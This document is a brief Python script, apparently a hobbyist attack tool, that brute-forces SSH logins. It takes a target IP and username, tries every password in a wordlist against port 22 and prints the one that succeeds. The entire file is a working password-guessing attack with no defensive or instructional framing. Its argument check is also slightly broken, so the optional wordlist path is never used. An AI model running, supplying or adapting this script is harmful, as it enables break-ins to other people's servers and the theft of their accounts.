import paramiko
import sys
import os

target = ""
username = ""
file = "./wordlists/wordlist2.txt"

def getArgs():
    try:
        global target
        global username
        target = sys.argv[1]
        username = sys.argv[2]
        global file;
        if(len(sys.argv) == 3):
            file = sys.argv[3]
    except Exception as e:
        if(len(sys.argv) < 3):
            pass;
        else:
            print("Invalid Arguments: <python.py> <target IP> <username> <OPTIONAL: file location");

def bruteSSH():
    global file
    global target
    global username
    #passwords = [];
    with open(file, "r") as f:
        for password in f:
            ssh = paramiko.SSHClient();
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy());
            try:
                ssh.connect(target.strip(), port=22, username=username.strip(), password=password.strip());
                print(username + "|" + password + "|" + target);
                print("Password Found: " + password);
                return 1;
            except Exception as e:
                print("nope-", end="", flush=True);
            ssh.close();
    return 0;

if __name__=="__main__":
    getArgs();
    returned = bruteSSH();
    if(returned == 1):
        print("PASSWORD WAS FOUND");
        sys.exit();
